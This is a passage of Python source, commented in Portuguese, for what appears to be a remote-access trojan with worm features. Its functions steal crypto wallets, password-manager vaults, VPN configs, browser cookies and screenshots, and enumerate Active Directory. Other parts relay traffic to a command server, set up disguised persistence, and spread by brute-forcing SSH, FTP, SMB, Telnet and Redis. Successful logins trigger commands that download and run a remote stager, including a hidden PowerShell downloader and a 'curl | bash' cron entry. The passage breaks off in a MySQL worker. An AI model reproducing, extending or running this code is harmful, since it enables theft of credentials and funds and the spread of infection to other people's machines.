        localappdata, "Google", "Chrome", "User Data", "Default",
        "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"
    )
    if os.path.isdir(mm_chrome):
        try:
            for root, _, files in os.walk(mm_chrome):
                for fname in files:
                    fpath = os.path.join(root, fname)
                    with open(fpath, "rb") as f:
                        content = f.read(1024 * 512)
                    result["MetaMask_Chrome_" + fname] = base64.b64encode(content).decode()
        except Exception as e:
            result["MetaMask_Chrome_error"] = str(e)

    # MetaMask — extensao Firefox
    ff_profiles = os.path.join(appdata, "Mozilla", "Firefox", "Profiles")
    if os.path.isdir(ff_profiles):
        for prof in os.listdir(ff_profiles):
            mm_ff = os.path.join(ff_profiles, prof, "storage", "default",
                                  "moz-extension+++", "data")
            if os.path.isdir(mm_ff):
                try:
                    result["MetaMask_Firefox_" + prof] = str(os.listdir(mm_ff))
                except Exception:
                    pass

    # Busca generica por wallet.dat no perfil do usuario (Bitcoin forks)
    for root, dirs, files in os.walk(home):
        dirs[:] = [d for d in dirs if d not in ("Windows", "System32", "Program Files")]
        for fname in files:
            if fname == "wallet.dat":
                fpath = os.path.join(root, fname)
                key = "wallet_dat_" + fpath.replace(os.sep, "_")
                if key not in result:
                    try:
                        with open(fpath, "rb") as f:
                            result[key] = base64.b64encode(f.read(1024 * 256)).decode()
                    except Exception:
                        pass
        # Limita profundidade para nao travar
        if root.count(os.sep) - home.count(os.sep) >= 5:
            dirs.clear()

    if not result:
        return "Nenhuma carteira de criptomoeda encontrada.", "error"
    return result, "crypto_wallets_result"


def capture_installed_software(args=None):
    """
    Lista software instalado via registry (Uninstall keys).
    Util para fingerprint do alvo e identificar software vulneravel.
    """
    if platform.system() != "Windows":
        return "Apenas Windows.", "error"

    software = []
    keys = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_CURRENT_USER,  r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
    ]

    for hive, path in keys:
        try:
            key = winreg.OpenKey(hive, path)
            i = 0
            while True:
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    i += 1
                    try:
                        sub = winreg.OpenKey(key, subkey_name)
                        def _qv(k, field):
                            try:
                                return winreg.QueryValueEx(k, field)[0]
                            except Exception:
                                return ""
                        name = _qv(sub, "DisplayName")
                        if not name:
                            winreg.CloseKey(sub)
                            continue
                        software.append({
                            "name":    name,
                            "version": _qv(sub, "DisplayVersion"),
                            "vendor":  _qv(sub, "Publisher"),
                            "install": _qv(sub, "InstallDate"),
                        })
                        winreg.CloseKey(sub)
                    except Exception:
                        pass
                except OSError:
                    break
            winreg.CloseKey(key)
        except Exception:
            pass

    if not software:
        return "Nenhum software encontrado.", "error"
    return {"software": software, "total": len(software)}, "installed_software_result"


def capture_network_shares(args=None):
    """
    Lista shares de rede (net share) e drives mapeados (net use).
    """
    result = {}
    sys32 = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32")
    net = os.path.join(sys32, "net.exe")

    for cmd_name, cmd in (("shares", [net, "share"]), ("mapped_drives", [net, "use"])):
        try:
            out = subprocess.check_output(cmd, stderr=subprocess.STDOUT,
                                          timeout=10, encoding="cp850", errors="ignore")
            result[cmd_name] = out.strip()
        except Exception as e:
            result[cmd_name] = "Erro: " + str(e)

    # Drives mapeados via WMI (mais detalhado)
    if _WIN32COM_OK:
        try:
            wmi = win32com.client.GetObject("winmgmts:")
            drives = []
            for item in wmi.InstancesOf("Win32_MappedLogicalDisk"):
                drives.append({
                    "drive":  item.DeviceID,
                    "unc":    item.ProviderName,
                    "label":  item.VolumeName,
                })
            if drives:
                result["wmi_mapped"] = drives
        except Exception:
            pass

    return result, "network_shares_result"


def capture_recent_files(args=None):
    """
    Coleta arquivos recentes do usuario (Jump Lists / Recent).
    Revela documentos sensiveis acessados recentemente.
    """
    recent_dir = os.path.join(
        os.environ.get("APPDATA", ""),
        r"Microsoft\Windows\Recent"
    )
    result = {}

    if not os.path.isdir(recent_dir):
        return "Diretorio Recent nao encontrado.", "error"

    # .lnk files (atalhos para arquivos recentes)
    recent_files = []
    try:
        for fname in sorted(os.listdir(recent_dir), reverse=True)[:200]:
            if fname.lower().endswith(".lnk"):
                # Extrai o caminho alvo do .lnk via leitura bruta (offset fixo no shell link)
                fpath = os.path.join(recent_dir, fname)
                target = ""
                try:
                    with open(fpath, "rb") as f:
                        data = f.read()
                    # Shell Link header: flags em offset 0x14, LinkTargetIDList logo depois
                    # Abordagem simples: busca strings imprimiveis longas (caminhos)
                    decoded = data.decode("utf-16-le", errors="ignore")
                    parts = [p for p in decoded.split("\x00") if len(p) > 5 and "\\" in p]
                    if parts:
                        target = parts[0]
                except Exception:
                    pass
                recent_files.append({"lnk": fname, "target": target})
    except Exception as e:
        result["error"] = str(e)

    result["recent"] = recent_files

    # AutomaticDestinations (Jump Lists de apps)
    jump_dir = os.path.join(
        os.environ.get("APPDATA", ""),
        r"Microsoft\Windows\Recent\AutomaticDestinations"
    )
    if os.path.isdir(jump_dir):
        try:
            jl_files = os.listdir(jump_dir)
            result["jump_list_count"] = len(jl_files)
            result["jump_list_files"] = jl_files[:50]
        except Exception:
            pass

    return result, "recent_files_result"


def capture_vpn_configs(args=None):
    """
    Coleta configuracoes de VPN: OpenVPN (.ovpn), WireGuard (.conf),
    Cisco AnyConnect, FortiClient.
    """
    home = os.path.expanduser("~")
    appdata = os.environ.get("APPDATA", "")
    result = {}

    # Diretorios e extensoes a buscar
    search_targets = [
        (home, (".ovpn", ".conf", ".p12", ".pfx")),
        (appdata, (".ovpn",)),
        (r"C:\Program Files\OpenVPN\config", (".ovpn",)),
        (r"C:\Program Files (x86)\OpenVPN\config", (".ovpn",)),
        (r"C:\ProgramData\WireGuard", (".conf",)),
    ]

    for base_dir, exts in search_targets:
        if not os.path.isdir(base_dir):
            continue
        try:
            for root, dirs, files in os.walk(base_dir):
                dirs[:] = [d for d in dirs if d not in ("node_modules", "__pycache__")]
                for fname in files:
                    if any(fname.lower().endswith(e) for e in exts):
                        fpath = os.path.join(root, fname)
                        try:
                            with open(fpath, "r", errors="ignore") as f:
                                content = f.read(32768)
                            result[fpath] = content
                        except Exception as e:
                            result[fpath] = "Erro: " + str(e)
                if root.count(os.sep) - base_dir.count(os.sep) >= 4:
                    dirs.clear()
        except Exception:
            pass

    # Cisco AnyConnect — perfis XML
    anyconnect_dir = os.path.join(
        os.environ.get("LOCALAPPDATA", ""),
        r"Cisco\Cisco AnyConnect Secure Mobility Client\preferences"
    )
    if os.path.isdir(anyconnect_dir):
        try:
            for fname in os.listdir(anyconnect_dir):
                fpath = os.path.join(anyconnect_dir, fname)
                with open(fpath, "r", errors="ignore") as f:
                    result["AnyConnect_" + fname] = f.read()
        except Exception:
            pass

    # FortiClient
    fc_key = r"Software\Fortinet\FortiClient\Sslvpn\Tunnels"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, fc_key)
        i = 0
        fc_tunnels = {}
        while True:
            try:
                tunnel = winreg.EnumKey(key, i)
                i += 1
                try:
                    tk = winreg.OpenKey(key, tunnel)
                    def _fqv(k, f):
                        try:
                            return winreg.QueryValueEx(k, f)[0]
                        except Exception:
                            return ""
                    fc_tunnels[tunnel] = {
                        "server":   _fqv(tk, "Server"),
                        "username": _fqv(tk, "Username"),
                    }
                    winreg.CloseKey(tk)
                except Exception:
                    pass
            except OSError:
                break
        winreg.CloseKey(key)
        if fc_tunnels:
            result["FortiClient"] = fc_tunnels
    except Exception:
        pass

    if not result:
        return "Nenhuma configuracao de VPN encontrada.", "error"
    return result, "vpn_configs_result"


def capture_ad_info(args=None):
    """
    Enumera informacoes de Active Directory se o host for domain-joined.
    Usa comandos nativos: nltest, net, dsquery (quando disponivel).
    Nao requer modulos externos.
    """
    sys32 = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32")

    def _run(cmd):
        try:
            return subprocess.check_output(
                cmd, stderr=subprocess.STDOUT, timeout=15,
                encoding="cp850", errors="ignore", shell=True
            ).strip()
        except Exception as e:
            return "Erro: " + str(e)

    result = {}

    # Verifica se e domain-joined
    domain_info = _run("wmic computersystem get Domain,PartOfDomain /value")
    result["domain_info"] = domain_info

    if "PartOfDomain=TRUE" not in domain_info:
        result["status"] = "Host nao e domain-joined."
        return result, "ad_info_result"

    # Informacoes do dominio
    result["nltest_dsgetdc"] = _run("nltest /dsgetdc:.")
    result["nltest_domain_trusts"] = _run("nltest /domain_trusts")

    # Usuarios e grupos
    result["domain_users"]     = _run("net user /domain")
    result["domain_admins"]    = _run('net group "Domain Admins" /domain')
    result["enterprise_admins"] = _run('net group "Enterprise Admins" /domain')
    result["domain_controllers"] = _run("nltest /dclist:.")

    # Computadores no dominio (requer dsquery — disponivel em Win Server)
    result["dsquery_computers"] = _run("dsquery computer -limit 100")
    result["dsquery_users"]     = _run("dsquery user -limit 100")

    # GPO aplicadas
    result["gpresult"] = _run("gpresult /r")

    return result, "ad_info_result"


def capture_password_managers(args=None):
    """
    Detecta e localiza arquivos de gerenciadores de senha:
      - KeePass: *.kdbx
      - Bitwarden: dados locais
      - 1Password: *.1pif, *.opvault, *.agilekeychain
      - LastPass: cache local
    Exfiltra apenas os arquivos .kdbx (vault offline) e metadados dos demais.
    """
    home = os.path.expanduser("~")
    appdata = os.environ.get("APPDATA", "")
    localappdata = os.environ.get("LOCALAPPDATA", "")
    result = {}

    # KeePass — busca .kdbx em todo o perfil do usuario
    kdbx_files = []
    for root, dirs, files in os.walk(home):
        dirs[:] = [d for d in dirs if d not in (
            "Windows", "System32", "SysWOW64", "Program Files",
            "node_modules", "__pycache__", ".git"
        )]
        for fname in files:
            if fname.lower().endswith(".kdbx"):
                fpath = os.path.join(root, fname)
                kdbx_files.append(fpath)
                try:
                    with open(fpath, "rb") as f:
                        data = f.read(1024 * 512)
                    result["KeePass_" + fname] = base64.b64encode(data).decode()
                except Exception as e:
                    result["KeePass_" + fname + "_error"] = str(e)
        if root.count(os.sep) - home.count(os.sep) >= 6:
            dirs.clear()

    # Bitwarden — cache local (Electron app)
    bw_paths = [
        os.path.join(appdata, "Bitwarden", "data.json"),
        os.path.join(appdata, "Bitwarden Desktop", "data.json"),
    ]
    for bw in bw_paths:
        if os.path.isfile(bw):
            try:
                with open(bw, "r", encoding="utf-8", errors="ignore") as f:
                    result["Bitwarden_data"] = f.read(1024 * 256)
            except Exception as e:
                result["Bitwarden_error"] = str(e)

    # 1Password
    op_paths = [
        os.path.join(home, ".1password"),
        os.path.join(appdata, "1Password"),
        os.path.join(localappdata, "1Password"),
    ]
    for op in op_paths:
        if os.path.isdir(op):
            result["1Password_dir"] = op
            files_found = []
            for root, _, files in os.walk(op):
                for fname in files:
                    if any(fname.endswith(e) for e in (".1pif", ".opvault", ".agilekeychain", ".b5")):
                        files_found.append(os.path.join(root, fname))
            result["1Password_vaults"] = files_found[:20]

    # LastPass (extensao Chrome — cache local)
    lp_ext = os.path.join(
        localappdata, "Google", "Chrome", "User Data", "Default",
        "Local Extension Settings", "hdokiejnpimakedhajhdlcegeplioahd"
    )
    if os.path.isdir(lp_ext):
        try:
            result["LastPass_Chrome_files"] = os.listdir(lp_ext)
        except Exception:
            pass

    if not result:
        return "Nenhum gerenciador de senha detectado.", "error"

    result["kdbx_found"] = kdbx_files
    return result, "password_managers_result"


# --- LÓGICA DE PIVOTEAMENTO (v2.9) ---

class PivotRequestHandler(BaseHTTPRequestHandler):
   
    def relay_request(self, method="GET", body_bytes=None):
        try:
            target_url = f"{SERVER_URL}{self.path}"

            headers = HTTP_HEADERS.copy()
            
            # Repassa os headers HMAC do agente filho para o C2
            for h in ['X-Request-Timestamp', 'X-Signature', 'Content-Type']:
                val = self.headers.get(h)
                if val:
                    headers[h] = val
            
            if method == "POST":
                response = requests.post(target_url, data=body_bytes, headers=headers, timeout=15)
            else: # GET
                response = requests.get(target_url, headers=headers, timeout=15)

            # Envia a resposta do C2 real de volta para o agente-filho
            self.send_response(response.status_code)
            for key, value in response.headers.items():
                if key not in ['Transfer-Encoding', 'Content-Encoding']: # Evita problemas de 'chunking'
                     self.send_header(key, value)
            self.end_headers()
            self.wfile.write(response.content)

        except Exception as e:
            write_internal_log(f"[PIVOT-ERROR] Falha ao retransmitir requisição para o C2: {e}")
            self.send_error(502, "Gateway Mal-sucedido (Falha no Relay do Pivot)")

    def do_GET(self):
        # O agente-filho está pedindo uma tarefa
        write_internal_log(f"[PIVOT-GET] Recebido GET do filho: {self.path}")
        self.relay_request(method="GET")

    def do_POST(self):
        # O agente-filho está se registrando ou enviando um resultado
        write_internal_log(f"[PIVOT-POST] Recebido POST do filho: {self.path}")
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length) # Lê o body (criptografado)
        self.relay_request(method="POST", body_bytes=post_data)

    def log_message(self, format, *args):
        # Silencia o log padrão do http.server para não poluir o stdout da vítima
        pass

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """ Um servidor HTTP que usa threads para lidar com cada conexão """
    daemon_threads = True # Permite que o agente principal saia

def start_pivot_listener(args):
    """
    Função principal da tarefa: Inicia o servidor de relay HTTP em uma thread.
    'args' deve ser a porta, ex: "8080"
    """
    global active_pivot_server
    if 'active_pivot_server' in globals() and active_pivot_server:
        return "Erro: Um listener de pivoteamento já está ativo.", "error"
        
    try:
        port = int(args)
        server_address = ('0.0.0.0', port)
        
        httpd = ThreadedHTTPServer(server_address, PivotRequestHandler)
        
        # Inicia o servidor em uma thread daemon separada
        server_thread = threading.Thread(target=httpd.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        
        globals()['active_pivot_server'] = httpd # Armazena a referência para podermos pará-lo depois
        msg = f"Sucesso: Listener de Pivoteamento HTTP iniciado em 0.0.0.0:{port}. Thread: {server_thread.name}"
        write_internal_log(msg)
        return msg, "info"
        
    except Exception as e:
        msg = f"Falha ao iniciar listener de pivoteamento: {e}"
        write_internal_log(msg)
        return msg, "error"

def capture_screenshot(args=None):
    """Captura todos os monitores conectados numa única imagem colada horizontalmente."""
    if ImageGrab is None:
        return "PIL/Pillow não disponível.", "error"
    try:
        # all_screens=True captura todos os monitores no Windows.
        # Em sistemas com um único monitor o comportamento é idêntico ao padrão.
        try:
            img = ImageGrab.grab(all_screens=True)
        except TypeError:
            # Versões antigas do Pillow não suportam all_screens — fallback seguro.
            img = ImageGrab.grab()

        screenshot_path = os.path.join(tempfile.gettempdir(), f"sc_{uuid.uuid4().hex[:8]}.png")
        img.save(screenshot_path, format="PNG")
        with open(screenshot_path, "rb") as f:
            screenshot_data = base64.b64encode(f.read()).decode("utf-8")
        try:
            os.remove(screenshot_path)
        except Exception:
            pass
        return screenshot_data, "screenshot_result"
    except Exception as e:
        return str(e), "error"

def capture_cookies(args=None):
    if browser_cookie3 is None:
        return "browser_cookie3 não disponível neste build.", "error"
    try:
        cookies = {}
        for browser in ["chrome", "firefox", "edge", "opera"]:
            try: cookies[browser.capitalize()] = {c.name: c.value for c in getattr(browser_cookie3, browser)()}
            except: continue
        return cookies, "cookies_result"
    except Exception as e: return str(e), "error"

def capture_process_info(args=None):
    try: return [p.info for p in psutil.process_iter(['pid', 'name', 'username'])], "processes_result"
    except Exception as e: return str(e), "error"

def establish_persistence(args):
    """
    Módulo de persistência aprimorado que permite ao operador escolher o método.
    Exemplos de 'args':
    - {"method": "run_key", "name": "TeamsUpdate"}
    - {"method": "schtask", "name": "GoogleCrashReport"}
    - {"method": "service", "name": "NvidiaDriverHelper", "display_name": "NVIDIA Driver Helper"}
    """
    system = platform.system()
    if system != "Windows":
        # A lógica para Linux (crontab) pode ser mantida ou expandida depois.
        # Por enquanto, focamos no Windows.
        return "Módulo de persistência aprimorado atualmente focado no Windows.", "error"

    try:
        # Validação dos argumentos recebidos
        if not isinstance(args, dict) or 'method' not in args:
            return "Erro: O método de persistência não foi especificado. (Ex: 'run_key', 'schtask')", "error"

        method = args.get("method")
        # Usa o nome fornecido ou um nome padrão aleatório se não for especificado
        name = args.get("name", "SystemUpdate" + "".join(random.choices(string.ascii_lowercase, k=6)))
        
        executable_path = sys.executable if getattr(sys, 'frozen', False) else f'"{sys.executable}" "{os.path.abspath(__file__)}"'
        
        # Constrói o caminho absoluto para os executáveis do sistema para evitar problemas com o PATH
        reg_path = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "reg.exe")
        schtasks_path = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "schtasks.exe")
        sc_path = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "sc.exe")

        # --- Lógica de Despacho para cada Método ---

        if method == "run_key":
            key_path = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
            command = [reg_path, 'add', key_path, '/v', name, '/t', 'REG_SZ', '/d', executable_path, '/f']
            subprocess.run(command, capture_output=True, shell=True)
            return f"Persistência estabelecida via Chave de Registro (Run Key) com o nome: '{name}'.", "persistence_result"

        elif method == "schtask":
            # Cria uma tarefa agendada para ser executada no logon do usuário
            command = [
                schtasks_path, '/create', '/sc', 'ONLOGON', 
                '/tn', name, 
                '/tr', f'"{executable_path}"', 
                '/rl', 'HIGHEST', # Tenta rodar com os maiores privilégios disponíveis
                '/f' # Força a criação se a tarefa já existir
            ]
            result = subprocess.run(command, capture_output=True, text=True, shell=True)
            if result.returncode == 0:
                return f"Persistência estabelecida via Tarefa Agendada com o nome: '{name}'.", "persistence_result"
            else:
                return f"Falha ao criar Tarefa Agendada: {result.stderr}", "error"

        elif method == "service":
            # Tenta criar um serviço. Requer privilégios de Administrador.
            if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                return "Erro: A criação de serviço requer privilégios de Administrador.", "error"
            
            display_name = args.get("display_name", name) # Nome que aparece na UI de serviços
            
            # Comando para criar o serviço
            create_command = [
                sc_path, 'create', name, 
                'binPath=', f'"{executable_path}"', 
                'start=', 'auto', 
                'DisplayName=', f'"{display_name}"'
            ]
            result = subprocess.run(create_command, capture_output=True, text=True, shell=True)
            if result.returncode != 0:
                return f"Falha ao criar o serviço: {result.stderr}", "error"
            
            # (Opcional) Adiciona uma descrição para parecer mais legítimo
            description_command = [sc_path, 'description', name, "Fornece suporte para componentes essenciais do sistema."]
            subprocess.run(description_command, capture_output=True, shell=True)
            
            return f"Persistência estabelecida via Serviço do Windows com o nome: '{name}'.", "persistence_result"

        else:
            return f"Erro: Método de persistência '{method}' desconhecido.", "error"

    except Exception as e:
        return f"Falha ao estabelecer persistência: {e}", "error"


def get_task():
    if not AGENT_ID: return None
    try:
        auth_headers = get_authenticated_headers()
        response = _http_get_with_fallback("/get_task/" + AGENT_ID, auth_headers, timeout=15)

        if response.status_code == 200:
            task = _decode_encrypted_json_response(response, "get_task")
            if not task:
                return None
            command = task.get("command")
            task_id = task.get("task_id")
            if not isinstance(command, str) or not command or len(command) > 128:
                write_internal_log("[get_task] comando ausente ou inválido")
                return None
            if command != "sleep" and (
                not isinstance(task_id, str) or not task_id or len(task_id) > 128
            ):
                write_internal_log("[get_task] task_id ausente ou inválido")
                return None
            return task
        elif response.status_code == 404:
            write_internal_log("[get_task] identidade não registrada; novo registro necessário")
            return {"_control": "reregister"}
        else:
            write_internal_log(f"[WARN] get_task recebeu status inesperado: {response.status_code}")
            return None

    except Exception as e:
        write_internal_log(f"[WARN] Erro em get_task: {type(e).__name__}")
        return None

    

def report_worm_activity(message, level="WORM_LOG"):
    """
    Envia um log de atividade específico do worm para o C2 para exibição no painel em tempo real.
    Esta função é separada do write_internal_log para não poluir o log principal.
    """
    try:
        # Usa um ID de tarefa falso, pois não é um resultado de tarefa real
        fake_task_id = f"worm-log-{uuid.uuid4()}"
        
        payload = {
            "agent_id": AGENT_ID, "task_id": fake_task_id,
            "data_type": level, # Será "WORM_LOG" ou "WORM_VULN"
            "result": str(message)
        }
        
        payload_json = json.dumps(payload)
        encrypted_payload = encrypt_data(payload_json, C2_AES_KEY)
        if not encrypted_payload: return

        payload_bytes = encrypted_payload.encode('utf-8')
        auth_headers = get_authenticated_headers(payload_bytes)
        
        base_url = SERVER_URL.split('/api')[0]
        post_url = urljoin(base_url, "/task_result")
        
        # Envia e não se preocupa com a resposta
        requests.post(post_url, data=payload_bytes, headers=auth_headers, timeout=5)
    except Exception:
        # Se falhar, não faz nada. A operação do worm continua.
        pass

# Propagation_Worker V2
def _worker_ssh(target_ip: str, credentials: list, stager_url: str, log_fn):
    """Tenta login via SSH com paramiko e executa o stager após sucesso."""
    try:
        import paramiko
    except ImportError:
        log_fn(f"[SSH] paramiko não disponível — pulando {target_ip}:22")
        return False
 
    for user, pwd in credentials:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                target_ip,
                port=22,
                username=user,
                password=pwd,
                timeout=8,
                banner_timeout=8,
                auth_timeout=8,
                look_for_keys=False,
                allow_agent=False
            )
            log_fn(f"[SSH] LOGIN OK em {target_ip} com {user}:{pwd}")
            _deploy_via_ssh(client, target_ip, stager_url, log_fn)
            client.close()
            return True
 
        except paramiko.AuthenticationException:
            pass  # credencial errada, continua
        except (paramiko.SSHException, socket.error, OSError):
            break  # host inacessível, para de tentar
        except Exception as e:
            log_fn(f"[SSH] Erro inesperado em {target_ip}: {e}")
            break
        finally:
            try:
                client.close()
            except Exception:
                pass
 
    return False
 
def _deploy_via_ssh(client, target_ip: str, stager_url: str, log_fn):
    """Faz o deploy do stager via canal SSH aberto."""
    try:
        # Tenta wget, depois curl como fallback
        cmd = (
            f"wget -q -O /tmp/.sysd_init '{stager_url}' 2>/dev/null || "
            f"curl -s -o /tmp/.sysd_init '{stager_url}'; "
            f"chmod +x /tmp/.sysd_init && sh /tmp/.sysd_init &"
        )
        stdin, stdout, stderr = client.exec_command(cmd, timeout=30)
        stdout.channel.recv_exit_status()  # aguarda conclusão
        log_fn(f"[SSH] Stager executado em {target_ip}.")
    except Exception as e:
        log_fn(f"[SSH] Falha ao executar stager em {target_ip}: {e}")
 
 
def _worker_ftp(target_ip: str, credentials: list, stager_url: str, log_fn):
    """Tenta login via FTP com ftplib (stdlib) e executa o stager via shell após upload."""
    import ftplib
 
    for user, pwd in credentials:
        try:
            ftp = ftplib.FTP()
            ftp.connect(target_ip, 21, timeout=8)
            ftp.login(user, pwd)
 
            log_fn(f"[FTP] LOGIN OK em {target_ip} com {user}:{pwd}")
 
            # Tenta verificar se o servidor permite execução de comandos via FTP SITE
            # (alguns servidores FTP embarcados suportam SITE EXEC)
            try:
                cmd = (
                    f"wget -q -O /tmp/.sysd_init '{stager_url}' "
                    f"&& chmod +x /tmp/.sysd_init && sh /tmp/.sysd_init &"
                )
                ftp.sendcmd(f"SITE EXEC {cmd}")
                log_fn(f"[FTP] SITE EXEC enviado para {target_ip}.")
            except ftplib.Error:
                # Servidor não suporta SITE EXEC — registra credencial para uso manual
                log_fn(f"[FTP] SITE EXEC não suportado em {target_ip}. Credencial válida: {user}:{pwd}")
                ftp.quit()
                return False
 
            ftp.quit()
            return True
 
        except ftplib.error_perm:
            pass  # credencial errada
        except (ftplib.Error, OSError, socket.error):
            break  # host inacessível
        except Exception as e:
            log_fn(f"[FTP] Erro inesperado em {target_ip}: {e}")
            break
 
    return False
 
 
def _worker_smb(target_ip: str, credentials: list, stager_url: str, log_fn):
    """Tenta autenticação SMB via impacket e copia/executa o stager."""
    try:
        from impacket.smbconnection import SMBConnection
        from impacket.dcerpc.v5 import transport, scmr as dcerpc_scmr
    except ImportError:
        log_fn(f"[SMB] impacket não disponível — pulando {target_ip}:445")
        return False
 
    for user, pwd in credentials:
        try:
            smb = SMBConnection(target_ip, target_ip, sess_port=445, timeout=10)
            smb.login(user, pwd, "", "", "")
 
            log_fn(f"[SMB] LOGIN OK em {target_ip} com {user}:{pwd}")
            _deploy_via_smb(smb, target_ip, stager_url, user, pwd, log_fn)
            smb.logoff()
            return True
 
        except Exception as e:
            err = str(e).lower()
            if "access_denied" in err or "logon_failure" in err:
                pass  # credencial errada, continua
            else:
                log_fn(f"[SMB] Erro em {target_ip}: {e}")
                break
 
    return False
 
def _deploy_via_smb(smb, target_ip: str, stager_url: str, user: str, pwd: str, log_fn):
    """Executa o stager no alvo Windows/Linux via serviço SMB."""
    try:
        from impacket.dcerpc.v5 import transport, scmr as dcerpc_scmr
        import random
        import string
 
        # Cria um nome de serviço aleatório para parecer legítimo
        svc_name = "".join(random.choices(string.ascii_lowercase, k=10))
 
        # Comando que o serviço vai executar
        # Funciona tanto para hosts Windows quanto Linux com Samba
        cmd = (
            f"cmd.exe /c powershell -NoP -W Hidden -Exec Bypass -Command "
            f"\"$p='$env:TEMP\\\\sysd.exe';"
            f"(New-Object Net.WebClient).DownloadFile('{stager_url}',$p);"
            f"Start-Process $p -WindowStyle Hidden\""
        )
 
        rpc = transport.SMBTransport(
            target_ip, target_ip,
            filename=r"\pipe\svcctl",
            smb_connection=smb
        )
        dce = rpc.get_dce_rpc()
        dce.connect()
        dce.bind(dcerpc_scmr.MSRPC_UUID_SCMR)
 
        scm = dcerpc_scmr.hROpenSCManagerW(dce)
        resp = dcerpc_scmr.hRCreateServiceW(
            dce, scm, svc_name, svc_name,
            lpBinaryPathName=cmd
        )
        svc_handle = resp["lpServiceHandle"]
 
        try:
            dcerpc_scmr.hRStartServiceW(dce, svc_handle)
            log_fn(f"[SMB] Serviço '{svc_name}' iniciado em {target_ip}.")
        except Exception:
            pass
        finally:
            try:
                dcerpc_scmr.hRDeleteService(dce, svc_handle)
            except Exception:
                pass
            dcerpc_scmr.hRCloseServiceHandle(dce, svc_handle)
 
    except Exception as e:
        log_fn(f"[SMB] Falha no deploy via serviço em {target_ip}: {e}")
 
 
def _worker_telnet(target_ip: str, credentials: list, stager_url: str, log_fn):
    """Tenta login via Telnet e executa o stager após sucesso."""
    try:
        import telnetlib
    except ImportError:
        log_fn(f"[Telnet] telnetlib não disponível — pulando {target_ip}:23")
        return False
 
    for user, pwd in credentials:
        tn = None
        try:
            tn = telnetlib.Telnet(target_ip, 23, timeout=8)
 
            # Aguarda prompt de login
            tn.read_until(b"login:", timeout=5)
            tn.write(user.encode("ascii") + b"\n")
 
            if pwd:
                tn.read_until(b"assword:", timeout=4)
                tn.write(pwd.encode("ascii") + b"\n")
 
            # Aguarda prompt de shell (#, $, >, %)
            index, _, _ = tn.expect([b"#", b"$", b">", b"%"], timeout=6)
 
            if index >= 0:
                log_fn(f"[Telnet] LOGIN OK em {target_ip} com {user}:{pwd}")
                cmd = (
                    f"wget -q -O /tmp/.sysd_init '{stager_url}' 2>/dev/null || "
                    f"curl -s -o /tmp/.sysd_init '{stager_url}'; "
                    f"chmod +x /tmp/.sysd_init && sh /tmp/.sysd_init &\n"
                )
                tn.write(cmd.encode("ascii"))
                time.sleep(3)  # aguarda execução
                log_fn(f"[Telnet] Stager enviado para {target_ip}.")
                tn.close()
                return True
 
        except (EOFError, socket.error, OSError):
            break  # host inacessível
        except Exception as e:
            log_fn(f"[Telnet] Erro em {target_ip}: {e}")
            break
        finally:
            try:
                if tn:
                    tn.close()
            except Exception:
                pass
 
    return False
 
def _worker_redis(target_ip: str, credentials: list, stager_url: str, log_fn):
    """
    Tenta autenticar no Redis via protocolo RESP puro (sem dependência externa).
    Redis sem senha: PING deve retornar +PONG.
    Redis com senha: AUTH <pwd> antes do PING.
    Se autenticado, configura cron via SLAVEOF/CONFIG SET para execução do stager.
    """
    import socket as _sock
    port = 6379

    def _resp_cmd(*args):
        cmd = f"*{len(args)}\r\n"
        for a in args:
            s = str(a)
            cmd += f"${len(s)}\r\n{s}\r\n"
        return cmd.encode()

    def _resp_recv(s):
        try:
            return s.recv(256).decode('utf-8', errors='ignore').strip()
        except Exception:
            return ""

    # Tenta sem senha primeiro
    try:
        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        s.settimeout(3)
        s.connect((target_ip, port))
        s.sendall(_resp_cmd("PING"))
        resp = _resp_recv(s)
        if "+PONG" in resp:
            log_fn(f"[REDIS] {target_ip}:{port} — acesso sem autenticacao. Configurando stager...")
            s.sendall(_resp_cmd("CONFIG", "SET", "dir", "/tmp"))
            s.sendall(_resp_cmd("CONFIG", "SET", "dbfilename", "cron_stager.sh"))
            payload = f"\n\n*/1 * * * * curl -s {stager_url} | bash\n\n"
            s.sendall(_resp_cmd("SET", "cron_key", payload))
            s.sendall(_resp_cmd("BGSAVE"))
            _resp_recv(s)
            s.close()
            return True
        s.close()
    except Exception:
        pass

    # Tenta com senhas da wordlist
    for user, pwd in credentials:
        if not pwd:
            continue
        try:
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target_ip, port))
            s.sendall(_resp_cmd("AUTH", pwd))
            resp = _resp_recv(s)
            if "+OK" in resp:
                log_fn(f"[REDIS] {target_ip}:{port} — autenticado com senha '{pwd}'.")
                s.sendall(_resp_cmd("CONFIG", "SET", "dir", "/tmp"))
                s.sendall(_resp_cmd("CONFIG", "SET", "dbfilename", "cron_stager.sh"))
                payload = f"\n\n*/1 * * * * curl -s {stager_url} | bash\n\n"
                s.sendall(_resp_cmd("SET", "cron_key", payload))
                s.sendall(_resp_cmd("BGSAVE"))
                _resp_recv(s)
                s.close()
                return True
            s.close()
        except Exception:
            pass

    log_fn(f"[REDIS] {target_ip}:{port} — sem acesso.")
    return False


def _worker_mysql(target_ip: str, credentials: list, stager_url: str, log_fn):
    """
    Tenta login no MySQL via pymysql (importação opcional).
    Se autenticado, executa SELECT INTO OUTFILE para dropar stager.
    """
    try:
        import pymysql
